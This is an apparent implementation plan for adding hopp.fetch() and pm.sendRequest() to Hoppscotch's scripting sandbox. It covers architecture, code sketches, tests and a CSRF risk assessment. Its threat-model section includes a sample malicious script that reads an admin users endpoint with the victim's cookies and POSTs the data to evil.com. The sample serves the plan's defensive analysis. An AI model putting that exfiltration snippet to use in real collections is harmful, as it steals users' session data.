# `hopp.fetch()` and `pm.sendRequest()` Implementation Plan

**Document Version:** 1.0
**Date:** 2025-11-04
**Author:** Claude Code (via James George)

---

## Executive Summary

This document provides a comprehensive implementation plan for adding `hopp.fetch()` and `pm.sendRequest()` to the Hoppscotch experimental scripting sandbox. These APIs will enable scripts to make additional HTTP requests during pre-request and post-request (test) execution, unlocking advanced workflows like chaining requests, fetching external data, and implementing complex authentication flows.

### Key Points

1. **Security Context**: `fetch` was previously removed (commit `e1f78b185`, May 28, 2025) due to CSRF concerns with cookies in self-hosted environments
2. **Solution**: Re-enable fetch with CSRF warning via the Inspector system when same-origin requests are detected
3. **Architecture**: Hook-based approach where sandbox scripts call `hopp.fetch()`, which delegates to the appropriate network layer (interceptors in app, axios in CLI)
4. **Compatibility**: `pm.sendRequest()` is a callback-wrapper around `hopp.fetch()` for Postman compatibility

---

## Table of Contents

1. [Background and Context](#1-background-and-context)
2. [Security Analysis](#2-security-analysis)
3. [Architecture Overview](#3-architecture-overview)
4. [Detailed Implementation Plan](#4-detailed-implementation-plan)
5. [File-by-File Changes](#5-file-by-file-changes)
6. [Testing Strategy](#6-testing-strategy)
7. [Migration Path](#7-migration-path)
8. [Risk Assessment](#8-risk-assessment)

---

## 1. Background and Context

### 1.1 Previous Work

**Commit `aab292413` (May 26, 2025):**
PR #5097 added `fetch()` module from `faraday-cage` to the experimental scripting sandbox:

```typescript
// packages/hoppscotch-js-sandbox/src/cage-modules/default.ts
import { fetch } from "faraday-cage/modules"

export const defaultModules = (config?) => {
  return [
    // ...
    fetch(),
    // ...
  ]
}
```

**Commit `e1f78b185` (May 28, 2025 - 2 days later):**
Removed `fetch()` with commit message:
> "chore: remove support for `fetch` from experimental scripting sandbox - To be revisited after addressing security implications."

**Why it was removed:**
- CSRF vulnerability with cookie-enabled requests
- Self-hosted (SH) deployments have session cookies that could be exfiltrated
- Scripts could make unauthorized requests using the user's session context
- No mitigation strategy was in place at the time

### 1.2 RFC Proposal (Discussion #5221)

The Scripting System RFC proposes:

**`hopp.fetch(url, options)`**
- Standard Fetch API signature
- Routes through Hoppscotch's interceptor system
- Handles CORS, proxy settings, and authentication automatically
- Returns standard `Response` object

**`pm.sendRequest(urlOrRequest, callback)`**
- Postman-compatible callback-based API
- Wraps `hopp.fetch()` internally
- Callback signature: `(error, response) => void`
- Supports both string URLs and request objects

**Use Cases:**
- Chain requests (fetch auth token, then use it in main request)
- External API calls within response handlers
- Complex multi-step authentication flows
- Data enrichment from third-party services

---

## 2. Security Analysis

### 2.1 The CSRF Threat

**What is the concern?**

In self-hosted environments, Hoppscotch uses cookies for session management:

```typescript
// packages/hoppscotch-backend/src/auth/helper.ts
{
  httpOnly: true,
  sameSite: 'lax', // CSRF protection
}
```

**Attack scenario WITHOUT mitigation:**

1. Attacker creates malicious collection with pre-request script:
   ```javascript
   // Malicious script
   const response = await fetch('https://hoppscotch.company.com/api/admin/users')
   const data = await response.json()
   // Exfiltrate data to attacker's server
   fetch('https://evil.com/collect', {
     method: 'POST',
     body: JSON.stringify(data)
   })
   ```

2. User imports collection
3. Script runs with user's cookies attached automatically
4. Attacker steals sensitive data or performs unauthorized actions

**Why SameSite=Lax doesn't fully protect:**
- SameSite=Lax allows cookies on top-level GET requests
- Scripts running in sandbox could craft requests that bypass SameSite
- Cookie jar in desktop app explicitly manages cookies (not browser-controlled)

### 2.2 Mitigation Strategy

**Primary Defense: Inspector Warning**

Implement a new `FetchInspectorService` that:

1. **Detects same-origin requests:**
   ```typescript
   const requestOrigin = new URL(fetchUrl).origin
   const appOrigin = window.location.origin
   if (requestOrigin === appOrigin) {
     // Emit warning
   }
   ```

2. **Warns user via Inspector UI:**
   - Severity: `1` (Warning level)
   - Icon: Warning/Alert icon
   - Message: "This script makes requests to the same origin as Hoppscotch. Ensure you trust this script before proceeding, as it could access your session data."
   - Location: `{ type: "response" }`
   - Action: Option to disable `hopp.fetch()` for this request

**Secondary Defenses:**

3. **Documentation & Education:**
   - Prominently document CSRF risks in `hopp.fetch()` documentation
   - Add warning in collection import UI when scripts contain `hopp.fetch()`
   - Create security best practices guide

4. **Future Enhancements:**
   - Rate limiting on `hopp.fetch()` calls per script execution
   - Allowlist/blocklist for fetch domains (user-configurable)
   - Explicit permission prompt for same-origin fetch (opt-in)

### 2.3 Why This is Acceptable

1. **User Trust Model:** Users already trust imported collections to modify requests (via `hopp.request.setUrl()`, `setHeader()`, etc.)
2. **Transparency:** Inspector warnings make the risk visible
3. **Legitimate Use Cases:** Same-origin fetch is needed for:
   - OAuth flows (fetching tokens from `/oauth/token`)
   - API versioning checks (`/api/version`)
   - Health checks (`/health`)
4. **Industry Precedent:** Postman allows `pm.sendRequest()` with similar risks

---

## 3. Architecture Overview

### 3.1 High-Level Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                         User Script                              │
│  const res = await hopp.fetch('https://api.example.com/data')   │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│              Faraday Cage Sandbox Module                         │
│  - hoppFetchModule: defineCageModule({ fetch: sandboxFn })      │
│  - Validates arguments                                           │
│  - Calls HOPP_FETCH_HOOK with URL and options                   │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│                   HOPP_FETCH_HOOK Handler                        │
│  (Different implementation per environment)                      │
├─────────────────────┬───────────────────────────────────────────┤
│   Web App           │          CLI                               │
│   ─────────         │          ───                               │
│   KernelInterceptor │          axios()                           │
│   Service.execute() │                                            │
└────────────────────┬┴───────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Network Request                               │
│  - Respects interceptor preference (browser/proxy/extension)    │
│  - Applies auth, headers, cookies as configured                 │
│  - Returns Response object                                       │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│                  Fetch Inspector Warning                         │
│  - Detects same-origin requests                                 │
│  - Emits inspector warning if origin matches                    │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Key Design Decisions

**1. Hook-Based Architecture**

Instead of directly accessing network layers, use a hook pattern:

```typescript
// Sandbox module calls hook
const response = await inputs.HOPP_FETCH_HOOK(url, options)

// Hook implementation differs by environment:
// - Web: Uses KernelInterceptorService
// - CLI: Uses axios directly
```

**Why?**
- **Decoupling:** Sandbox doesn't know about interceptors or axios
- **Testability:** Easy to mock the hook in tests
- **Flexibility:** Can change network implementation without touching sandbox

**2. Interceptor Preference Respect (Web Only)**

```typescript
// In web environment
const kernelInterceptorService = useService(KernelInterceptorService)
const result = kernelInterceptorService.execute(relayRequest)
```

**Why?**
- Users expect `hopp.fetch()` to respect their interceptor choice (browser/proxy/extension/native)
- Maintains consistency with main request execution
- Inherits all interceptor capabilities (auth, proxies, certs)

**3. CLI: Direct Axios**

```typescript
// In CLI environment
const response = await axios(requestConfig)
```

**Why?**
- CLI has no interceptor concept
- Axios is already used for all network requests in CLI
- Simpler implementation, fewer abstractions

**4. Postman Compatibility via Wrapper**

```typescript
pm.sendRequest(url, (error, response) => {
  // Internally calls hopp.fetch() and adapts response
})
```

**Why?**
- Maximizes Postman script migration compatibility
- Callback API matches Postman exactly
- Minimal additional code (just adapter layer)

---

## 4. Detailed Implementation Plan

### Phase 1: Core Infrastructure (Week 1-2)

**4.1.1 Add Faraday-Cage Fetch Module**

Re-enable the fetch module that was previously removed:

```typescript
// packages/hoppscotch-js-sandbox/src/cage-modules/default.ts
import { fetch } from "faraday-cage/modules"

export const defaultModules = (config?: DefaultModulesConfig) => {
  return [
    // ... existing modules
    fetch({
      fetchImpl: async (url, init) => {
        // Delegate to hook instead of using global fetch
        const response = await config?.hoppFetchHook?.(url, init)
        if (!response) {
          throw new Error('hopp.fetch is not available in this context')
        }
        return response
      },
    }),
  ]
}
```

**4.1.2 Define Hook Interface**

```typescript
// packages/hoppscotch-js-sandbox/src/types/index.ts

export type HoppFetchHook = (
  url: string | Request,
  init?: RequestInit
) => Promise<Response>

export type HoppFetchConfig = {
  // For web app: interceptor service
  interceptor?: KernelInterceptorService
  // For CLI: axios instance
  axiosInstance?: AxiosInstance
}
```

**4.1.3 Implement Web Hook Handler**

```typescript
// packages/hoppscotch-common/src/helpers/fetch/hopp-fetch.ts

import { KernelInterceptorService } from '~/services/kernel-interceptor.service'
import { RelayRequest } from '@hoppscotch/kernel/relay/v/1'

export const createHoppFetchHook = (
  kernelInterceptor: KernelInterceptorService
): HoppFetchHook => {
  return async (url, init) => {
    // Convert fetch API to RelayRequest
    const relayRequest = convertFetchToRelayRequest(url, init)

    // Execute via interceptor
    const execution = kernelInterceptor.execute(relayRequest)
    const result = await execution.response

    if (E.isLeft(result)) {
      throw new Error(`Fetch failed: ${result.left.humanMessage.heading}`)
    }

    // Convert RelayResponse to Response
    return convertRelayResponseToFetchResponse(result.right)
  }
}

function convertFetchToRelayRequest(
  url: string | Request,
  init?: RequestInit
): RelayRequest {
  const urlStr = typeof url === 'string' ? url : url.url
  const method = init?.method || 'GET'
  const headers = init?.headers ? headersToRecord(init.headers) : {}

  // Handle body based on type
  let body: RelayRequest['body']
  if (init?.body) {
    if (typeof init.body === 'string') {
      body = { type: 'text', data: init.body }
    } else if (init.body instanceof FormData) {
      body = { type: 'formdata', data: formDataToArray(init.body) }
    } else if (init.body instanceof Blob) {
      body = { type: 'blob', data: await blobToUint8Array(init.body) }
    }
  }

  return {
    url: urlStr,
    method,
    headers,
    body,
    // ... other relay request properties
  }
}

function convertRelayResponseToFetchResponse(
  relayResponse: RelayResponse
): Response {
  const headers = new Headers(relayResponse.headers)
  const status = relayResponse.status
  const statusText = relayResponse.statusText || ''

  // Create Response with body
  return new Response(relayResponse.body, {
    status,
    statusText,
    headers,
  })
}
```

**4.1.4 Implement CLI Hook Handler**

```typescript
// packages/hoppscotch-cli/src/utils/hopp-fetch.ts

import axios, { AxiosRequestConfig } from 'axios'

export const createHoppFetchHook = (): HoppFetchHook => {
  return async (url, init) => {
    // Convert fetch API to axios config
    const config: AxiosRequestConfig = {
      url: typeof url === 'string' ? url : url.url,
      method: (init?.method || 'GET') as Method,
      headers: init?.headers ? headersToObject(init.headers) : {},
      data: init?.body,
      responseType: 'arraybuffer', // For binary safety
    }

    try {
      const axiosResponse = await axios(config)

      // Convert axios response to Response
      const headers = new Headers()
      Object.entries(axiosResponse.headers).forEach(([key, value]) => {
        headers.set(key, String(value))
      })

      return new Response(axiosResponse.data, {
        status: axiosResponse.status,
        statusText: axiosResponse.statusText,
        headers,
      })
    } catch (error) {
      if (axios.isAxiosError(error) && error.response) {
        // Return error response as Response object
        return new Response(error.response.data, {
          status: error.response.status,
          statusText: error.response.statusText,
          headers: new Headers(error.response.headers as Record<string, string>),
        })
      }
      throw error
    }
  }
}
```

### Phase 2: Sandbox Integration (Week 2-3)

**4.2.1 Update Sandbox Execution Context**

```typescript
// packages/hoppscotch-js-sandbox/src/node/pre-request/experimental.ts

import { createHoppFetchHook } from '@hoppscotch/cli/utils/hopp-fetch'

export const runPreRequestScript = async (
  script: string,
  options: RunPreRequestScriptOptions
): Promise<PreRequestScriptResult> => {
  const hoppFetchHook = createHoppFetchHook()

  const modules = defaultModules({
    handleConsoleEntry: (entry) => { /* ... */ },
    hoppFetchHook, // Pass hook to sandbox
  })

  // ... rest of execution
}
```

```typescript
// packages/hoppscotch-common/src/helpers/RequestRunner.ts

import { createHoppFetchHook } from '~/helpers/fetch/hopp-fetch'
import { KernelInterceptorService } from '~/services/kernel-interceptor.service'

// In runPreRequestScript / runTestScript
const kernelInterceptor = useService(KernelInterceptorService)
const hoppFetchHook = createHoppFetchHook(kernelInterceptor)

const scriptResult = await runPreRequestScript(script, {
  envs,
  request,
  experimentalScriptingSandbox: true,
  hoppFetchHook, // Pass hook
})
```

**4.2.2 Expose `hopp.fetch()` in Bootstrap**

```typescript
// packages/hoppscotch-js-sandbox/src/bootstrap-code/pre-request.js

globalThis.hopp = {
  // ... existing properties
  fetch: async (url, options) => {
    return await inputs.HOPP_FETCH_HOOK(url, options)
  },
}
```

**4.2.3 Implement `pm.sendRequest()` Wrapper**

```typescript
// packages/hoppscotch-js-sandbox/src/bootstrap-code/pre-request.js

globalThis.pm = {
  // ... existing properties
  sendRequest: (urlOrRequest, callback) => {
    // Parse arguments (Postman supports both string and object)
    let url, options

    if (typeof urlOrRequest === 'string') {
      url = urlOrRequest
      options = {}
    } else {
      // Object format: { url, method, header, body }
      url = urlOrRequest.url
      options = {
        method: urlOrRequest.method || 'GET',
        headers: urlOrRequest.header
          ? Object.fromEntries(urlOrRequest.header.map(h => [h.key, h.value]))
          : {},
        body: urlOrRequest.body?.raw,
      }
    }

    // Call hopp.fetch() and adapt response
    globalThis.hopp.fetch(url, options)
      .then(response => {
        // Convert Response to Postman response format
        response.text().then(body => {
          const pmResponse = {
            code: response.status,
            status: response.statusText,
            headers: Array.from(response.headers.entries()).map(([k, v]) => ({
              key: k,
              value: v,
            })),
            body,
            json: () => {
              try {
                return JSON.parse(body)
              } catch {
                return null
              }
            },
          }

          callback(null, pmResponse)
        })
      })
      .catch(error => {
        callback(error, null)
      })
  },
}
```

### Phase 3: Security & Monitoring (Week 3-4)

**4.3.1 Create Fetch Inspector Service**

```typescript
// packages/hoppscotch-common/src/services/inspection/inspectors/fetch.inspector.ts

import { Service } from 'dioc'
import { Inspector, InspectorResult, InspectionService } from '..'
import { computed, Ref } from 'vue'
import { HoppRESTRequest } from '@hoppscotch/data'
import { HoppRESTResponse } from '~/helpers/types/HoppRESTResponse'
import IconAlertTriangle from '~icons/lucide/alert-triangle'

export class FetchInspectorService extends Service implements Inspector {
  public static readonly ID = 'FETCH_INSPECTOR_SERVICE'
  public readonly inspectorID = 'fetch'

  private readonly inspection = this.bind(InspectionService)

  override onServiceInit() {
    this.inspection.registerInspector(this)
  }

  getInspections(
    req: Readonly<Ref<HoppRESTRequest>>,
    res: Readonly<Ref<HoppRESTResponse | null | undefined>>
  ): Ref<InspectorResult[]> {
    return computed(() => {
      const results: InspectorResult[] = []
      const response = res.value

      // Only check if response exists (meaning script ran)
      if (!response || !response.meta?.scriptExecutionLog) return results

      // Check console logs for fetch calls
      const fetchCalls = this.detectFetchCalls(response.meta.scriptExecutionLog)

      // Check for same-origin fetch
      fetchCalls.forEach(fetchUrl => {
        const requestOrigin = this.extractOrigin(fetchUrl)
        const appOrigin = window.location.origin

        if (requestOrigin === appOrigin) {
          results.push({
            id: `fetch-same-origin-${fetchUrl}`,
            text: {
              type: 'text',
              text: [
                'This script makes requests to the same origin as Hoppscotch.',
                `URL: ${fetchUrl}`,
                'Ensure you trust this script, as it could access your session data.',
              ],
            },
            icon: IconAlertTriangle,
            severity: 1, // Warning
            isApplicable: true,
            doc: {
              text: 'Learn about CSRF risks with hopp.fetch()',
              link: 'https://docs.hoppscotch.io/features/scripting#fetch-security',
            },
            locations: { type: 'response' },
          })
        }
      })

      return results
    })
  }

  private detectFetchCalls(logs: ConsoleEntry[]): string[] {
    // Parse logs to find fetch() calls
    // This is a simplified approach - in production, we'd track fetch calls explicitly
    const urls: string[] = []

    logs.forEach(log => {
      if (log.type === 'log' && typeof log.args[0] === 'string') {
        const match = log.args[0].match(/fetch\(['"](.+?)['"]\)/)
        if (match) {
          urls.push(match[1])
        }
      }
    })

    return urls
  }

  private extractOrigin(url: string): string {
    try {
      return new URL(url).origin
    } catch {
      return ''
    }
  }
}
```

**4.3.2 Track Fetch Calls Properly**

Instead of relying on console logs, explicitly track fetch calls:

```typescript
// packages/hoppscotch-js-sandbox/src/types/index.ts

export type FetchCallMeta = {
  url: string
  method: string
  timestamp: number
}

export type ScriptExecutionMeta = {
  consoleEntries: ConsoleEntry[]
  fetchCalls: FetchCallMeta[] // NEW
}
```

```typescript
// Update hook to track calls
export const createHoppFetchHook = (
  kernelInterceptor: KernelInterceptorService,
  onFetchCall?: (meta: FetchCallMeta) => void // NEW
): HoppFetchHook => {
  return async (url, init) => {
    const urlStr = typeof url === 'string' ? url : url.url

    // Track the call
    onFetchCall?.({
      url: urlStr,
      method: init?.method || 'GET',
      timestamp: Date.now(),
    })

    // ... rest of implementation
  }
}
```

### Phase 4: Testing & Documentation (Week 4-5)

**4.4.1 Unit Tests**

```typescript
// packages/hoppscotch-js-sandbox/src/__tests__/hopp-namespace/fetch.spec.ts

describe('hopp.fetch()', () => {
  test('should make basic GET request', async () => {
    const mockResponse = { data: 'test' }
    const mockHook = vi.fn().mockResolvedValue(
      new Response(JSON.stringify(mockResponse), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      })
    )

    const result = await runScript(
      `
        const res = await hopp.fetch('https://api.example.com/data')
        const data = await res.json()
        hopp.env.set('result', data.data)
      `,
      { global: [], selected: [] },
      { hoppFetchHook: mockHook }
    )

    expect(mockHook).toHaveBeenCalledWith('https://api.example.com/data', undefined)
    expect(result.envs.selected).toContainEqual({ key: 'result', value: 'test' })
  })

  test('should support POST with JSON body', async () => {
    const mockHook = vi.fn().mockResolvedValue(new Response('OK'))

    await runScript(
      `
        await hopp.fetch('https://api.example.com/data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ foo: 'bar' })
        })
      `,
      { global: [], selected: [] },
      { hoppFetchHook: mockHook }
    )

    expect(mockHook).toHaveBeenCalledWith(
      'https://api.example.com/data',
      expect.objectContaining({
        method: 'POST',
        headers: expect.objectContaining({ 'Content-Type': 'application/json' }),
        body: '{"foo":"bar"}',
      })
    )
  })
})
```

```typescript
// packages/hoppscotch-js-sandbox/src/__tests__/pm-namespace/sendRequest.spec.ts

describe('pm.sendRequest()', () => {
  test('should call callback with response', (done) => {
    const mockResponse = { status: 'ok' }
    const mockHook = vi.fn().mockResolvedValue(
      new Response(JSON.stringify(mockResponse), { status: 200 })
    )

    runScript(
      `
        pm.sendRequest('https://api.example.com/status', (err, res) => {
          pm.environment.set('code', res.code)
          pm.environment.set('data', res.json().status)
        })
      `,
      { global: [], selected: [] },
      { hoppFetchHook: mockHook }
    ).then(result => {
      expect(result.envs.selected).toContainEqual({ key: 'code', value: 200 })
      expect(result.envs.selected).toContainEqual({ key: 'data', value: 'ok' })
      done()
    })
  })

  test('should support request object format', (done) => {
    const mockHook = vi.fn().mockResolvedValue(new Response('OK'))

    runScript(
      `
        pm.sendRequest({
          url: 'https://api.example.com/data',
          method: 'POST',
          header: [
            { key: 'Authorization', value: 'Bearer token123' }
          ],
          body: {
            mode: 'raw',
            raw: JSON.stringify({ test: true })
          }
        }, (err, res) => {
          pm.environment.set('done', 'true')
        })
      `,
      { global: [], selected: [] },
      { hoppFetchHook: mockHook }
    ).then(() => {
      expect(mockHook).toHaveBeenCalledWith(
        'https://api.example.com/data',
        expect.objectContaining({
          method: 'POST',
          headers: expect.objectContaining({ Authorization: 'Bearer token123' }),
        })
      )
      done()
    })
  })
})
```

**4.4.2 Integration Tests (CLI)**

```typescript
// packages/hoppscotch-cli/src/__tests__/e2e/hopp-fetch.spec.ts

describe('hopp.fetch in CLI', () => {
  test('should execute fetch in pre-request script', async () => {
    const collection = {
      name: 'Fetch Test',
      requests: [
        {
          name: 'Chained Request',
          method: 'GET',
          url: 'https://httpbin.org/headers',
          preRequestScript: `
            const tokenRes = await hopp.fetch('https://httpbin.org/uuid')
            const token = (await tokenRes.json()).uuid
            hopp.env.set('token', token)
            hopp.request.setHeader('X-Token', token)
          `,
        },
      ],
    }

    const result = await runCLICollection(collection)

    expect(result.reports[0].status).toBe('pass')
    expect(result.reports[0].request.headers).toContainEqual(
      expect.objectContaining({ key: 'X-Token' })
    )
  })
})
```

**4.4.3 E2E Tests (Web)**

```typescript
// packages/hoppscotch-common/src/helpers/__tests__/hopp-fetch-integration.spec.ts

describe('hopp.fetch with interceptors', () => {
  test('should respect current interceptor selection', async () => {
    const kernelInterceptorService = useService(KernelInterceptorService)
    kernelInterceptorService.setActive('browser')

    const hoppFetchHook = createHoppFetchHook(kernelInterceptorService)
    const response = await hoppFetchHook('https://httpbin.org/get', {})

    expect(response.ok).toBe(true)
    expect(response.status).toBe(200)
  })
})
```

---

## 5. File-by-File Changes

### 5.1 Packages to Modify

#### `@hoppscotch/js-sandbox`

| File | Change Type | Description |
|------|-------------|-------------|
| `src/cage-modules/default.ts` | **Modify** | Re-add `fetch()` module with custom `fetchImpl` |
| `src/types/index.ts` | **Add** | Define `HoppFetchHook`, `FetchCallMeta` types |
| `src/bootstrap-code/pre-request.js` | **Modify** | Add `hopp.fetch()` and `pm.sendRequest()` |
| `src/bootstrap-code/post-request.js` | **Modify** | Add `hopp.fetch()` and `pm.sendRequest()` |
| `src/__tests__/hopp-namespace/fetch.spec.ts` | **Create** | Unit tests for `hopp.fetch()` |
| `src/__tests__/pm-namespace/sendRequest.spec.ts` | **Create** | Unit tests for `pm.sendRequest()` |

#### `@hoppscotch/common`

| File | Change Type | Description |
|------|-------------|-------------|
| `src/helpers/fetch/hopp-fetch.ts` | **Create** | `createHoppFetchHook()` for web app |
| `src/helpers/RequestRunner.ts` | **Modify** | Pass `hoppFetchHook` to script execution |
| `src/services/inspection/inspectors/fetch.inspector.ts` | **Create** | CSRF warning inspector |
| `src/platform/std/inspectors/index.ts` | **Modify** | Register `FetchInspectorService` |
| `src/helpers/__tests__/hopp-fetch-integration.spec.ts` | **Create** | Integration tests |

#### `@hoppscotch/cli`

| File | Change Type | Description |
|------|-------------|-------------|
| `src/utils/hopp-fetch.ts` | **Create** | `createHoppFetchHook()` for CLI (axios-based) |
| `src/utils/pre-request.ts` | **Modify** | Pass `hoppFetchHook` to script runner |
| `src/utils/test.ts` | **Modify** | Pass `hoppFetchHook` to test runner |
| `src/__tests__/e2e/hopp-fetch.spec.ts` | **Create** | E2E tests for CLI fetch |

### 5.2 Detailed Change Specifications

**`packages/hoppscotch-js-sandbox/src/cage-modules/default.ts`**

```diff
 import {
   blobPolyfill,
   ConsoleEntry,
   console as ConsoleModule,
   crypto,
   encoding,
   esmModuleLoader,
+  fetch,
   timers,
   urlPolyfill,
 } from "faraday-cage/modules"
+import { HoppFetchHook } from "../types"

 type DefaultModulesConfig = {
   handleConsoleEntry: (consoleEntries: ConsoleEntry) => void
+  hoppFetchHook?: HoppFetchHook
 }

 export const defaultModules = (config?: DefaultModulesConfig) => {
   return [
     urlPolyfill,
     blobPolyfill,
     ConsoleModule({ /* ... */ }),
     crypto({ cryptoImpl: globalThis.crypto }),
     esmModuleLoader,
+    fetch({
+      fetchImpl: config?.hoppFetchHook,
+    }),
     encoding(),
     timers(),
   ]
 }
```

**`packages/hoppscotch-common/src/helpers/RequestRunner.ts`**

```diff
+import { createHoppFetchHook } from '~/helpers/fetch/hopp-fetch'
+import { KernelInterceptorService } from '~/services/kernel-interceptor.service'

 export const runPreRequestScript = async (
   preRequestScript: string,
   options: RunPreRequestScriptOptions
 ) => {
+  const kernelInterceptor = useService(KernelInterceptorService)
+  const hoppFetchHook = createHoppFetchHook(kernelInterceptor)

   if (!EXPERIMENTAL_SCRIPTING_SANDBOX.value) {
     // Legacy sandbox
   } else {
     // Experimental sandbox
     return runPreRequestScript(cleanScript, {
       envs,
       experimentalScriptingSandbox: true,
+      hoppFetchHook,
     })
   }
 }
```

---

## 6. Testing Strategy

### 6.1 Test Pyramid

```
         ┌────────────────┐
         │   E2E Tests    │  (10%)
         │  - Full flows  │
         └────────────────┘
        ┌──────────────────┐
        │ Integration Tests│  (30%)
        │ - Hook handlers  │
        │ - Interceptors   │
        └──────────────────┘
     ┌────────────────────────┐
     │     Unit Tests         │  (60%)
     │ - hopp.fetch()         │
     │ - pm.sendRequest()     │
     │ - Fetch inspector      │
     └────────────────────────┘
```

### 6.2 Test Coverage Requirements

- **Unit Tests:** ≥90% coverage for:
  - `hopp.fetch()` API
  - `pm.sendRequest()` wrapper
  - Fetch-to-Relay conversion functions
  - Relay-to-Fetch response conversion
  - Fetch inspector logic

- **Integration Tests:** ≥80% coverage for:
  - Hook handlers (web & CLI)
  - Interceptor integration
  - Error handling paths

- **E2E Tests:** Key user flows:
  - Chained authentication (fetch token → use token)
  - External API data enrichment
  - Error scenarios (network failure, CORS)
  - Same-origin CSRF warning display

### 6.3 Critical Test Cases

**TC-001: Basic GET Request**
- **Given:** Script with `hopp.fetch('https://httpbin.org/get')`
- **When:** Pre-request script executes
- **Then:** Fetch succeeds, response is accessible

**TC-002: POST with JSON Body**
- **Given:** Script with POST request and JSON body
- **When:** Script executes
- **Then:** Request body is correctly serialized and sent

**TC-003: pm.sendRequest Callback**
- **Given:** Script with `pm.sendRequest(url, callback)`
- **When:** Request completes
- **Then:** Callback receives `(null, response)` with Postman format

**TC-004: Same-Origin CSRF Warning**
- **Given:** Script with `hopp.fetch(window.location.origin + '/api/users')`
- **When:** Script executes
- **Then:** Inspector warning is displayed

**TC-005: Interceptor Preference (Browser)**
- **Given:** Browser interceptor selected
- **When:** `hopp.fetch()` executes
- **Then:** Request uses browser interceptor (subject to CORS)

**TC-006: Interceptor Preference (Proxy)**
- **Given:** Proxy interceptor selected
- **When:** `hopp.fetch()` executes
- **Then:** Request routes through proxy

**TC-007: CLI Axios Integration**
- **Given:** CLI pre-request script with `hopp.fetch()`
- **When:** CLI runs collection
- **Then:** Request executes via axios

**TC-008: Error Handling - Network Failure**
- **Given:** Script with `hopp.fetch()` to unreachable URL
- **When:** Network fails
- **Then:** Promise rejects with descriptive error

**TC-009: Error Handling - CORS Blocked**
- **Given:** Browser interceptor, cross-origin request
- **When:** CORS blocks request
- **Then:** Error is caught and can be handled in script

---

## 7. Migration Path

### 7.1 Postman Migration Guide

**Before (Postman):**
```javascript
pm.sendRequest('https://api.example.com/token', (err, res) => {
  if (err) {
    console.error(err)
  } else {
    const token = res.json().access_token
    pm.environment.set('auth_token', token)
  }
})
```

**After (Hoppscotch - Identical!):**
```javascript
// Same code works unchanged!
pm.sendRequest('https://api.example.com/token', (err, res) => {
  if (err) {
    console.error(err)
  } else {
    const token = res.json().access_token
    pm.environment.set('auth_token', token)
  }
})
```

### 7.2 Recommended Hoppscotch Pattern

**Using `hopp.fetch()` (modern async/await):**
```javascript
try {
  const res = await hopp.fetch('https://api.example.com/token')
  const data = await res.json()
  hopp.env.set('auth_token', data.access_token)
} catch (error) {
  console.error('Token fetch failed:', error)
}
```

### 7.3 Migration Tool

**Automatic Postman → Hoppscotch Converter:**

```typescript
// packages/hoppscotch-common/src/helpers/import-export/import/postman.ts

function convertPostmanScriptToHoppscotch(pmScript: string): string {
  // pm.sendRequest is already compatible, no conversion needed!
  // But we can suggest hopp.fetch() for new scripts
  return pmScript // No changes required
}
```

---

## 8. Risk Assessment

### 8.1 Security Risks

| Risk | Severity | Mitigation | Residual Risk |
|------|----------|------------|---------------|
| **CSRF via same-origin fetch** | **HIGH** | Inspector warning, user education | **MEDIUM** |
| **Data exfiltration** | **MEDIUM** | Rate limiting (future), fetch domain blocklist (future) | **MEDIUM** |
| **Denial of service (fetch flooding)** | **LOW** | Rate limiting (future), script timeout (existing) | **LOW** |

### 8.2 Performance Risks

| Risk | Severity | Mitigation | Residual Risk |
|------|----------|------------|---------------|
| **Slow scripts blocking UI** | **MEDIUM** | Scripts run in Worker (existing), timeout (existing) | **LOW** |
| **Memory leaks from fetch responses** | **LOW** | Response auto-cleanup on script end | **LOW** |
| **Interceptor overload** | **LOW** | Fetch uses same queue as main requests | **LOW** |

### 8.3 Compatibility Risks

| Risk | Severity | Mitigation | Residual Risk |
|------|----------|------------|---------------|
| **Breaking changes to existing scripts** | **LOW** | Only adds new APIs, no removals | **VERY LOW** |
| **Postman incompatibility** | **LOW** | pm.sendRequest matches Postman spec exactly | **VERY LOW** |
| **Browser compatibility** | **VERY LOW** | Fetch API widely supported (polyfilled in faraday-cage) | **VERY LOW** |

### 8.4 Rollback Plan

If critical issues arise post-launch:

1. **Immediate:** Add feature flag `EXPERIMENTAL_HOPP_FETCH` (default: `false`)
2. **Short-term:** Disable fetch module in `defaultModules()`
3. **Long-term:** Revert commits and re-evaluate security model

---

## Appendix A: API Reference

### `hopp.fetch(url, options)`

**Signature:**
```typescript
function fetch(
  url: string | Request,
  options?: RequestInit
): Promise<Response>
```

**Parameters:**
- `url` (string | Request): The URL to fetch or a Request object
- `options` (RequestInit, optional):
  - `method` (string): HTTP method (default: `'GET'`)
  - `headers` (HeadersInit): Request headers
  - `body` (BodyInit): Request body (string, FormData, Blob, etc.)
  - `mode`, `credentials`, `cache`, etc. (standard Fetch API options)

**Returns:** `Promise<Response>` - Standard Fetch API Response object

**Example:**
```javascript
// Simple GET
const res = await hopp.fetch('https://api.example.com/data')
const json = await res.json()

// POST with JSON
const res = await hopp.fetch('https://api.example.com/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Alice' })
})
```

**Differences from standard `fetch()`:**
- Routes through Hoppscotch's interceptor system (web app only)
- Respects interceptor preference (browser/proxy/extension/native)
- Triggers CSRF inspector warning for same-origin requests

---

### `pm.sendRequest(url, callback)`

**Signature:**
```typescript
function sendRequest(
  url: string | PostmanRequest,
  callback: (error: Error | null, response: PostmanResponse | null) => void
): void
```

**Parameters:**
- `url` (string | PostmanRequest):
  - String: Simple URL
  - Object: `{ url, method, header, body }`
- `callback` (function): Callback with `(error, response)` signature

**PostmanRequest Object:**
```typescript
{
  url: string
  method?: string  // Default: 'GET'
  header?: Array<{ key: string, value: string }>
  body?: {
    mode: 'raw' | 'urlencoded' | 'formdata'
    raw?: string
    urlencoded?: Array<{ key: string, value: string }>
    formdata?: Array<{ key: string, value: string, type?: 'text' | 'file' }>
  }
}
```

**PostmanResponse Object:**
```typescript
{
  code: number        // HTTP status code
  status: string      // Status text
